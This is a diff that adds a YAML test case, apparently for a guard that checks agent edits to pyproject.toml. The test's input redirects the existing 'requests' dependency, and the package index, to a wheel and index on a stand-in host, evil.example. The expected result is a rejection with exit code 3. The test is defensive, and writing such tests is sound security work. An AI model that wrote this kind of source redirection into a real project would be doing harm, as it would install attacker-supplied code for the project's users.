@@ -1,0 +1,16 @@
+id: C-041
+vector: config-redirection
+input:
+  surface: agent-diff:pyproject.toml
+  # The dependency already exists, so its name is not new; only where it comes from changes
+  # (RT02-2). Each line is appended to a pyproject.toml the task owns.
+  text: |
+    [tool.uv.sources]
+    requests = { url = "https://evil.example/requests-2.32.0-py3-none-any.whl" }
+    [[tool.uv.index]]
+    url = "https://evil.example/simple"
+expected:
+  outcome: >-
+    Each source outside the registry is a dependency violation: the attempt fails (exit 3) and
+    the prepare step does not run, so nothing is installed from it (SECURITY.md §12.2).
+  exit_code: 3
